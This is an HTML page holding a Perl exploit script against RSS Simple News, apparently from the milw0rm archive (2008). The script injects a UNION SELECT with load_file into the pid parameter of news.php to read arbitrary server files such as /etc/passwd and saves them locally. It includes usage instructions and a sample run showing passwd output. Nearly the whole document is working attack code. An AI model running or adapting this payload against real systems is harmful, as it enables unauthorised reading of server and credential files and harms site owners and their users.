<html><head><title>RSS Simple News (news.php pid) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
################################
##    Coded by Piker [piker(dot)ther00t(at)gmail(dot)com]
##      D.O.M Team
## piker,ka0x,an0de,xarnuz
## 2008 Security Researchers
################################
##
## RSS Simple News Remote SQL Injection Exploit
## http://sourceforge.net/projects/rss-simple-news/
##
##   This exploit tries to read an
##   arbitrary file.
##
##   It needs magic_quotes_gpc=off
##
################################

# piker@domlabs:~/advisories$ perl rss.pl http://localhost/rss /etc/passwd
#[+] File HEX: 0x2f6574632f706173737764
#[+] Host: http://localhost/rss/
#[+] File content:
#daemon:x:1:1:daemon:/usr/sbin:/bin/sh
#bin:x:2:2:bin:/bin:/bin/sh
#sys:x:3:3:sys:/dev:/bin/sh
#sync:x:4:65534:sync:/bin:/bin/sync
#games:x:5:60:games:/usr/games:/bin/sh
# [...]
#[+] EOF
#
#


use LWP::UserAgent;

open(FILE, &quot;&gt;&amp;STDOUT&quot;);

my $host = $ARGV[0];
my $file = $ARGV[1];

die &amp;_USO unless $ARGV[1];

sub _USO
{
    die &quot;
    RSS Simple News Remote Sql Injection Exploit

    This exploit tries to read an
    arbitrary file.

    It needs magic_quotes_gpc=off

    usage: ./$0 &lt;host&gt; &lt;file_you_want&gt;
    ex: ./$0 http://localhost/rss/ /etc/passwd

    &quot;;
}

my $ua = LWP::UserAgent-&gt;new() or die;
$ua-&gt;agent(&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1&quot;);

my $tmp=&quot;0x&quot;;
my $tmp2;

foreach my $c (split(//, $file)){
    $tmp2 = sprintf (&quot;%x&quot;, ord($c));
    $tmp .= $tmp2;
}

print FILE &quot;[+] File HEX: &quot;.$tmp.&quot;\n&quot;;

if ($host !~ /\/$/){ $host .= &quot;/&quot;; }

print FILE &quot;[+] Host: &quot;.$host.&quot;\n&quot;;

my $req = HTTP::Request-&gt;new(GET =&gt; $host.&quot;news.php?pid=-1' union select 1,2,3,4,CONCAT(0x3c46494c453e,load_file(&quot;.$tmp.&quot;),0x3c46494c453e),6 and 'a'='a&quot;);
my $res = $ua-&gt;request($req);
my $con = $res-&gt;content;

my $ok = 0;
open (OUT, &quot;&gt;result.txt&quot;);

if ($res-&gt;is_success){
    foreach my $linea (split(/\n/, $con)){
        if($ok == 1){
            if ($linea !~ /&lt;FILE&gt;/){
                print FILE $linea.&quot;\n&quot;;
        print OUT $linea.&quot;\n&quot;;
            }else{
                print FILE &quot;\n[+] EOF\n&quot;;
        print &quot;\n[+] File saved into 'result.txt'\n&quot;;
                goto salida;
            }
        }
        if($linea =~ /&lt;FILE&gt;/i &amp;&amp; $ok == 0){
            $ok = 1;
            print FILE &quot;[+] File content: \n&quot;;
        }
    }
    salida:
    if ($ok == 0){
        print FILE &quot;[-] Exploit Failed!\n&quot;;
    }      
}
else{
    print FILE &quot;[-] Exploit Failed!\n&quot;;
}

close(FILE);
close(OUT);

#EOF

# milw0rm.com [2008-12-22]</pre></html>